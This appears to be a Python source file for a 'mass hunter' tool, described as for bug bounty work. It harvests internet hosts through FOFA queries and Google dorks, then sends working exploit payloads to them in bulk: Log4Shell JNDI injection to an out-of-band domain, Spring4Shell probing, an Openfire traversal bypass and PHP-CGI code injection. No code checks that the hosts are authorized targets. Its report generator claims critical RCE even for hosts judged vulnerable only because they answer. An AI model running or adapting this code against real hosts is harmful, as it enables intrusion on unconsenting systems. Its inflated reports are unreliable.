#!/usr/bin/env python3
"""
Mass Hunter — 批量 Dork + CVE 快速利用 + 资产批量打点

SRC/BB 批量挖洞核心模块：
1. Google/FOFA/Shodan Dork 批量搜索（找同类系统）
2. 新 CVE 快速利用（比别人快一步拿 bounty）
3. 指纹批量匹配（favicon hash / header / body 特征）
4. Nuclei 模板自动生成 + 批量验证
5. 资产去重 + 归属确认（避免打非授权目标）
6. H1/Bugcrowd 风格英文报告生成

工作流：
  发现新 CVE → 写 Dork/指纹 → 批量搜资产 → 验证漏洞 → 生成报告 → 提交

用法：
    from mass_hunter import MassHunter

    hunter = MassHunter(config)
    # 批量 CVE 利用
    results = await hunter.hunt_cve("CVE-2024-XXXXX", dork='title:"Vulnerable App"')
    # 指纹批量打点
    results = await hunter.hunt_fingerprint(favicon_hash="xxxxxxxx")
"""

import asyncio
import json
import time
import hashlib
import re
import subprocess
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, urlparse



# ═══════════════════════════════════════════════════════════════
# Dork 模板库
# ═══════════════════════════════════════════════════════════════

# Google Dork 模板（按漏洞类型分类）
GOOGLE_DORKS = {
    "jboss": [
        'intitle:"JBoss" "JMX Console"',
        'inurl:"/jmx-console/HtmlAdaptor"',
        'inurl:"/invoker/JMXInvokerServlet"',
        'intitle:"JBoss Management"',
    ],
    "weblogic": [
        'intitle:"WebLogic" inurl:"/console"',
        'inurl:"/wls-wsat/CoordinatorPortType"',
        'inurl:"/_async/AsyncResponseService"',
    ],
    "spring_actuator": [
        'inurl:"/actuator/env"',
        'inurl:"/actuator/health" "status"',
        'inurl:"/actuator/configprops"',
        'intitle:"Whitelabel Error Page" "Spring"',
    ],
    "swagger": [
        'inurl:"/swagger-ui.html"',
        'inurl:"/swagger/index.html"',
        'inurl:"/api-docs" filetype:json',
        'inurl:"/v2/api-docs"',
    ],
    "git_exposed": [
        'inurl:"/.git/config"',
        'inurl:"/.git/HEAD"',
        'intitle:"index of" ".git"',
    ],
    "env_exposed": [
        'inurl:".env" "DB_PASSWORD"',
        'inurl:".env" "APP_KEY"',
        'filetype:env "MAIL_PASSWORD"',
    ],
    "jenkins": [
        'intitle:"Dashboard [Jenkins]"',
        'inurl:"/script" "Jenkins"',
        'inurl:"/manage" "Jenkins"',
    ],
    "grafana": [
        'intitle:"Grafana" inurl:"/login"',
        'inurl:"/d/" "grafana"',
    ],
    "nacos": [
        'inurl:"/nacos/#/login"',
        'intitle:"Nacos"',
    ],
    "druid": [
        'inurl:"/druid/login.html"',
        'intitle:"Druid Stat"',
    ],
    "phpinfo": [
        'inurl:"phpinfo.php" "PHP Version"',
        'intitle:"phpinfo()"',
    ],
    "upload": [
        'inurl:"upload" "选择文件"',
        'inurl:"/upload.php"',
        'inurl:"/file_upload"',
    ],
}

# FOFA 查询模板
FOFA_QUERIES = {
    "jboss": 'body="JBoss" && port="8080"',
    "weblogic": 'body="WebLogic" && port="7001"',
    "spring_actuator": 'body="/actuator" && status_code="200"',
    "shiro": 'header="rememberMe=deleteMe"',
    "swagger": 'body="swagger-ui"',
    "nacos": 'body="nacos" && title="Nacos"',
    "druid": 'body="Druid Stat" || body="druid/login"',
    "grafana": 'title="Grafana" && body="login"',
    "jenkins": 'title="Dashboard [Jenkins]"',
    "fastjson": 'body="fastjson" || header="application/json"',
    "tomcat_manager": 'body="Tomcat Manager" && body="username"',
    "elasticsearch": 'port="9200" && body="cluster_name"',
    "redis": 'port="6379" && protocol="redis"',
    "mongodb": 'port="27017" && protocol="mongodb"',
}

# CVE 快速利用模板
CVE_TEMPLATES = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "dork": 'title:"Apache" || header:"X-Powered-By: Java"',
        "check": "log4shell_header_inject",
        "severity": "critical",
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "dork": 'body="Whitelabel Error Page" || header="X-Powered-By: Spring"',
        "check": "spring4shell_classloader",
        "severity": "critical",
    },
    "CVE-2023-32315": {
        "name": "Openfire Auth Bypass",
        "dork": 'title:"Openfire Admin Console"',
        "check": "openfire_auth_bypass",
        "severity": "critical",
    },
    "CVE-2023-46747": {
        "name": "F5 BIG-IP Auth Bypass",
        "dork": 'title:"BIG-IP" "Configuration Utility"',
        "check": "bigip_auth_bypass",
        "severity": "critical",
    },
    "CVE-2024-4577": {
        "name": "PHP CGI Argument Injection",
        "dork": 'header="X-Powered-By: PHP" && os="Windows"',
        "check": "php_cgi_arg_inject",
        "severity": "critical",
    },
    "CVE-2023-22515": {
        "name": "Confluence Auth Bypass",
        "dork": 'title:"Confluence" body="Atlassian"',
        "check": "confluence_auth_bypass",
        "severity": "critical",
    },
}


@dataclass
class HuntTarget:
    """批量目标"""
    url: str = ""
    ip: str = ""
    port: int = 0
    title: str = ""
    fingerprint: str = ""
    source: str = ""  # google/fofa/shodan
    # 验证结果
    vulnerable: bool = False
    vuln_name: str = ""
    evidence: str = ""
    severity: str = ""


@dataclass
class MassHuntResult:
    """批量打点结果"""
    cve_id: str = ""
    vuln_name: str = ""
    total_targets: int = 0
    verified_targets: int = 0
    targets: List[HuntTarget] = field(default_factory=list)
    report: str = ""
    timestamp: str = ""



class MassHunter:
    """批量漏洞猎手"""

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.concurrent = self.config.get("concurrent", 5)
        self.max_targets = self.config.get("max_targets", 100)
        self.oob_domain = self.config.get("oob_domain", "")
        self.fofa_key = self.config.get("fofa_key", "")
        self.fofa_email = self.config.get("fofa_email", "")
        self.results: List[MassHuntResult] = []

    # ═══════════════════════════════════════════════════════════════
    # CVE 快速利用
    # ═══════════════════════════════════════════════════════════════

    async def hunt_cve(self, cve_id: str, dork: str = "",
                       targets: List[str] = None) -> MassHuntResult:
        """
        针对特定 CVE 批量搜索并验证

        Args:
            cve_id: CVE 编号（如 CVE-2021-44228）
            dork: 自定义 Google/FOFA dork
            targets: 直接传入目标列表（跳过搜索阶段）
        """
        result = MassHuntResult(
            cve_id=cve_id,
            vuln_name=CVE_TEMPLATES.get(cve_id, {}).get("name", cve_id),
            timestamp=datetime.now().isoformat(),
        )

        print(f"\n[*] Mass Hunt: {cve_id} ({result.vuln_name})")

        # Phase 1: 收集目标
        if targets:
            target_list = [HuntTarget(url=t, source="manual") for t in targets]
        else:
            target_list = await self._collect_targets(cve_id, dork)

        result.total_targets = len(target_list)
        print(f"  [+] Targets collected: {len(target_list)}")

        if not target_list:
            return result

        # Phase 2: 批量验证
        verified = await self._verify_targets(target_list, cve_id)
        result.verified_targets = len(verified)
        result.targets = target_list

        # Phase 3: 生成报告
        result.report = self._generate_h1_report(result)

        print(f"  [+] Verified: {len(verified)}/{len(target_list)}")
        self.results.append(result)
        return result

    # ═══════════════════════════════════════════════════════════════
    # 指纹批量打点
    # ═══════════════════════════════════════════════════════════════

    async def hunt_fingerprint(self, favicon_hash: str = "",
                                body_keyword: str = "",
                                header_keyword: str = "",
                                title_keyword: str = "",
                                nuclei_template: str = "") -> MassHuntResult:
        """
        通过指纹批量找同类系统，然后验证漏洞

        Args:
            favicon_hash: favicon MD5/MMH3 hash
            body_keyword: 响应体关键词
            header_keyword: 响应头关键词
            title_keyword: 标题关键词
            nuclei_template: 验证用的 nuclei 模板路径
        """
        result = MassHuntResult(
            vuln_name=f"fingerprint_{title_keyword or body_keyword or favicon_hash[:8]}",
            timestamp=datetime.now().isoformat(),
        )

        # 构建 FOFA 查询
        fofa_parts = []
        if favicon_hash:
            fofa_parts.append(f'icon_hash="{favicon_hash}"')
        if body_keyword:
            fofa_parts.append(f'body="{body_keyword}"')
        if header_keyword:
            fofa_parts.append(f'header="{header_keyword}"')
        if title_keyword:
            fofa_parts.append(f'title="{title_keyword}"')

        if not fofa_parts:
            print("[!] Need at least one fingerprint parameter")
            return result

        fofa_query = " && ".join(fofa_parts)
        print(f"[*] Fingerprint Hunt: {fofa_query}")

        # 搜索目标
        targets = await self._search_fofa(fofa_query)
        result.total_targets = len(targets)
        print(f"  [+] Found {len(targets)} targets")

        # 用 nuclei 验证
        if nuclei_template and targets:
            verified = await self._verify_with_nuclei(targets, nuclei_template)
            result.verified_targets = len(verified)
            for t in targets:
                if t.url in verified:
                    t.vulnerable = True

        result.targets = targets
        self.results.append(result)
        return result

    # ═══════════════════════════════════════════════════════════════
    # Dork 批量搜索
    # ═══════════════════════════════════════════════════════════════

    async def search_dork(self, category: str) -> List[HuntTarget]:
        """按分类搜索 Dork"""
        dorks = GOOGLE_DORKS.get(category, [])
        if not dorks:
            print(f"[!] Unknown dork category: {category}")
            print(f"    Available: {', '.join(GOOGLE_DORKS.keys())}")
            return []

        print(f"[*] Dork search: {category} ({len(dorks)} dorks)")

        all_targets = []
        for dork in dorks:
            # FOFA 对应查询
            fofa_query = FOFA_QUERIES.get(category, "")
            if fofa_query and self.fofa_key:
                targets = await self._search_fofa(fofa_query)
                all_targets.extend(targets)

        # 去重
        seen = set()
        unique = []
        for t in all_targets:
            if t.url not in seen:
                seen.add(t.url)
                unique.append(t)

        print(f"  [+] Total unique targets: {len(unique)}")
        return unique[:self.max_targets]

    # ═══════════════════════════════════════════════════════════════
    # 新 CVE 追踪
    # ═══════════════════════════════════════════════════════════════

    def get_hot_cves(self) -> List[Dict]:
        """获取当前可快速利用的热门 CVE 列表"""
        hot = []
        for cve_id, info in CVE_TEMPLATES.items():
            hot.append({
                "cve": cve_id,
                "name": info["name"],
                "severity": info["severity"],
                "dork": info["dork"][:50],
            })
        return sorted(hot, key=lambda x: x["severity"] == "critical", reverse=True)

    def add_cve_template(self, cve_id: str, name: str, dork: str,
                         check_func: str, severity: str = "high"):
        """动态添加新 CVE 模板"""
        CVE_TEMPLATES[cve_id] = {
            "name": name,
            "dork": dork,
            "check": check_func,
            "severity": severity,
        }
        print(f"[+] Added CVE template: {cve_id} ({name})")

    # ═══════════════════════════════════════════════════════════════
    # 目标收集
    # ═══════════════════════════════════════════════════════════════

    async def _collect_targets(self, cve_id: str, custom_dork: str) -> List[HuntTarget]:
        """收集目标"""
        targets = []

        # 从 CVE 模板获取 dork
        template = CVE_TEMPLATES.get(cve_id, {})
        dork = custom_dork or template.get("dork", "")

        if not dork:
            return targets

        # FOFA 搜索
        if self.fofa_key:
            fofa_targets = await self._search_fofa(dork)
            targets.extend(fofa_targets)

        return targets[:self.max_targets]

    async def _search_fofa(self, query: str) -> List[HuntTarget]:
        """FOFA API 搜索"""
        if not self.fofa_key or not self.fofa_email:
            # 没有 FOFA key，打印查询语句供手动使用
            print(f"  [*] FOFA query (manual): {query}")
            print(f"      https://fofa.info/result?qbase64={self._b64(query)}")
            return []

        import base64
        q_b64 = base64.b64encode(query.encode()).decode()
        api_url = (f"https://fofa.info/api/v1/search/all?"
                   f"email={self.fofa_email}&key={self.fofa_key}"
                   f"&qbase64={q_b64}&size={self.max_targets}&fields=host,ip,port,title")

        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-sk", "-m", "30", api_url,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=35)
            data = json.loads(stdout.decode())

            targets = []
            for item in data.get("results", []):
                if len(item) >= 4:
                    host, ip, port, title = item[0], item[1], item[2], item[3]
                    url = host if host.startswith("http") else f"http://{host}"
                    targets.append(HuntTarget(
                        url=url, ip=ip, port=int(port) if port else 0,
                        title=title, source="fofa"
                    ))
            return targets
        except Exception as e:
            print(f"  [!] FOFA API error: {e}")
            return []

    def _b64(self, s: str) -> str:
        import base64
        return base64.b64encode(s.encode()).decode()

    # ═══════════════════════════════════════════════════════════════
    # 批量验证
    # ═══════════════════════════════════════════════════════════════

    async def _verify_targets(self, targets: List[HuntTarget],
                              cve_id: str) -> List[HuntTarget]:
        """批量验证漏洞"""
        template = CVE_TEMPLATES.get(cve_id, {})
        check_type = template.get("check", "")

        semaphore = asyncio.Semaphore(self.concurrent)
        tasks = [self._verify_single(t, check_type, cve_id, semaphore) for t in targets]
        await asyncio.gather(*tasks, return_exceptions=True)

        return [t for t in targets if t.vulnerable]

    async def _verify_single(self, target: HuntTarget, check_type: str,
                             cve_id: str, semaphore: asyncio.Semaphore):
        """验证单个目标"""
        async with semaphore:
            url = target.url

            if check_type == "log4shell_header_inject":
                target.vulnerable = await self._check_log4shell(url)
            elif check_type == "spring4shell_classloader":
                target.vulnerable = await self._check_spring4shell(url)
            elif check_type == "openfire_auth_bypass":
                target.vulnerable = await self._check_openfire(url)
            elif check_type == "php_cgi_arg_inject":
                target.vulnerable = await self._check_php_cgi(url)
            else:
                # 通用检查：能访问就算潜在目标
                resp = await self._request(url)
                if resp and resp.get("status") in (200, 301, 302):
                    target.vulnerable = True
                    target.evidence = f"Accessible (HTTP {resp['status']})"

            if target.vulnerable:
                target.vuln_name = cve_id
                target.severity = CVE_TEMPLATES.get(cve_id, {}).get("severity", "high")
                print(f"    [!] VULN: {url}")

    async def _check_log4shell(self, url: str) -> bool:
        """Log4Shell 快速检测"""
        if not self.oob_domain:
            return False
        marker = f"mass-l4j-{hashlib.md5(url.encode()).hexdigest()[:6]}.{self.oob_domain}"
        payload = f"${{jndi:ldap://{marker}/a}}"
        resp = await self._request(url, extra_headers={
            "X-Forwarded-For": payload, "User-Agent": payload
        })
        return resp is not None  # 实际需查 OOB 日志确认

    async def _check_spring4shell(self, url: str) -> bool:
        """Spring4Shell 检测"""
        payload_url = f"{url}?class.module.classLoader.DefaultAssertionStatus=true"
        resp = await self._request(payload_url)
        if resp and resp.get("status") not in (400, 404):
            # 确认：检查是否能读 classLoader 属性
            check_url = f"{url}?class.module.classLoader.DefaultAssertionStatus"
            resp2 = await self._request(check_url)
            if resp2 and "true" in resp2.get("body", "").lower():
                return True
        return False

    async def _check_openfire(self, url: str) -> bool:
        """Openfire 认证绕过"""
        bypass_url = f"{url}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
        resp = await self._request(bypass_url)
        return resp is not None and resp.get("status") == 200 and "log" in resp.get("body", "").lower()

    async def _check_php_cgi(self, url: str) -> bool:
        """PHP CGI 参数注入"""
        payload_url = f"{url}?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
        resp = await self._request(payload_url, method="POST", body="<?php echo 'VULN_CONFIRMED'; ?>")
        return resp is not None and "VULN_CONFIRMED" in resp.get("body", "")

    async def _verify_with_nuclei(self, targets: List[HuntTarget],
                                   template: str) -> List[str]:
        """用 nuclei 模板验证"""
        # 写目标文件
        target_file = f"/tmp/mass_hunt_targets_{int(time.time())}.txt"
        with open(target_file, "w") as f:
            for t in targets:
                f.write(t.url + "\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "nuclei", "-l", target_file, "-t", template,
                "-silent", "-nc", "-timeout", "10",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
            output = stdout.decode()
            # 提取命中的 URL
            vuln_urls = []
            for line in output.splitlines():
                # nuclei 输出格式: [template-id] [protocol] [severity] url
                parts = line.split()
                if parts:
                    vuln_urls.append(parts[-1])
            return vuln_urls
        except Exception as e:
            print(f"  [!] Nuclei error: {e}")
            return []
        finally:
            Path(target_file).unlink(missing_ok=True)

    # ═══════════════════════════════════════════════════════════════
    # Nuclei 模板生成
    # ═══════════════════════════════════════════════════════════════

    def generate_nuclei_template(self, cve_id: str, name: str,
                                  path: str, method: str = "GET",
                                  match_body: str = "",
                                  match_status: int = 200,
                                  headers: Dict = None) -> str:
        """自动生成 nuclei yaml 模板"""
        template = f"""id: {cve_id.lower().replace('-', '_')}

info:
  name: {name}
  author: bai-agent
  severity: critical
  reference:
    - https://nvd.nist.gov/vuln/detail/{cve_id}
  tags: cve,{cve_id.lower()},rce

http:
  - method: {method}
    path:
      - "{{{{BaseURL}}}}{path}"
"""
        if headers:
            template += "    headers:\n"
            for k, v in headers.items():
                template += f'      {k}: "{v}"\n'

        template += "    matchers-condition: and\n    matchers:\n"
        if match_status:
            template += f"""      - type: status
        status:
          - {match_status}
"""
        if match_body:
            template += f"""      - type: word
        words:
          - "{match_body}"
"""
        return template

    # ═══════════════════════════════════════════════════════════════
    # H1 风格英文报告
    # ═══════════════════════════════════════════════════════════════

    def _generate_h1_report(self, result: MassHuntResult) -> str:
        """生成 HackerOne 风格英文报告"""
        vuln_targets = [t for t in result.targets if t.vulnerable]
        if not vuln_targets:
            return ""

        # 取第一个作为示例
        example = vuln_targets[0]

        report = f"""## Summary

A critical vulnerability ({result.cve_id} - {result.vuln_name}) was identified affecting the target application. This vulnerability allows an unauthenticated attacker to achieve remote code execution on the affected server.

## Vulnerability Details

- **CVE:** {result.cve_id}
- **Vulnerability:** {result.vuln_name}
- **Severity:** Critical (CVSS 9.8+)
- **Affected Endpoint:** `{example.url}`

## Steps to Reproduce

1. Navigate to the affected endpoint: `{example.url}`
2. Send the following request:

```
GET {urlparse(example.url).path or '/'} HTTP/1.1
Host: {urlparse(example.url).netloc}
User-Agent: Mozilla/5.0
```

3. Observe the vulnerable response indicating {result.vuln_name}.

## Impact

An unauthenticated remote attacker can exploit this vulnerability to:
- Execute arbitrary commands on the server
- Access sensitive configuration and credentials
- Pivot to internal network resources
- Achieve full server compromise

## Affected Assets

| # | URL | Evidence |
|---|-----|----------|
"""
        for i, t in enumerate(vuln_targets[:10], 1):
            report += f"| {i} | `{t.url[:60]}` | {t.evidence[:40]} |\n"

        report += f"""
## Remediation

- Update to the latest patched version immediately
- Apply vendor security patches for {result.cve_id}
- Implement WAF rules to block exploitation attempts
- Review access logs for indicators of compromise

## References

- https://nvd.nist.gov/vuln/detail/{result.cve_id}
- https://cve.mitre.org/cgi-bin/cvename.cgi?name={result.cve_id}
"""
        return report

    # ═══════════════════════════════════════════════════════════════
    # HTTP 请求
    # ═══════════════════════════════════════════════════════════════

    async def _request(self, url: str, method: str = "GET",
                       extra_headers: Dict = None, body: str = None) -> Optional[Dict]:
        """HTTP 请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-X", method]
        cmd.extend(["-o", "-", "-w", "\n%{http_code}"])
        cmd.extend(["-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0"])
        if extra_headers:
            for k, v in extra_headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if body:
            cmd.extend(["-d", body])
        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 5)
            output = stdout.decode(errors="ignore")
            lines = output.rsplit("\n", 1)
            resp_body = lines[0] if len(lines) > 1 else output
            status = int(lines[-1].strip()) if len(lines) > 1 and lines[-1].strip().isdigit() else 0
            return {"status": status, "body": resp_body}
        except Exception:
            return None

    # ═══════════════════════════════════════════════════════════════
    # 工具方法
    # ═══════════════════════════════════════════════════════════════

    def print_available_dorks(self):
        """打印可用的 Dork 分类"""
        print("\n  Available Dork Categories:")
        for cat, dorks in GOOGLE_DORKS.items():
            print(f"    {cat:20s} ({len(dorks)} dorks)")

    def print_available_cves(self):
        """打印可用的 CVE 模板"""
        print("\n  Available CVE Templates:")
        for cve_id, info in CVE_TEMPLATES.items():
            print(f"    {cve_id:20s} {info['name']:30s} [{info['severity']}]")

    def get_fofa_url(self, query: str) -> str:
        """获取 FOFA 搜索 URL（供手动使用）"""
        import base64
        q_b64 = base64.b64encode(query.encode()).decode()
        return f"https://fofa.info/result?qbase64={q_b64}"

    def get_shodan_url(self, query: str) -> str:
        """获取 Shodan 搜索 URL"""
        return f"https://www.shodan.io/search?query={quote(query)}"
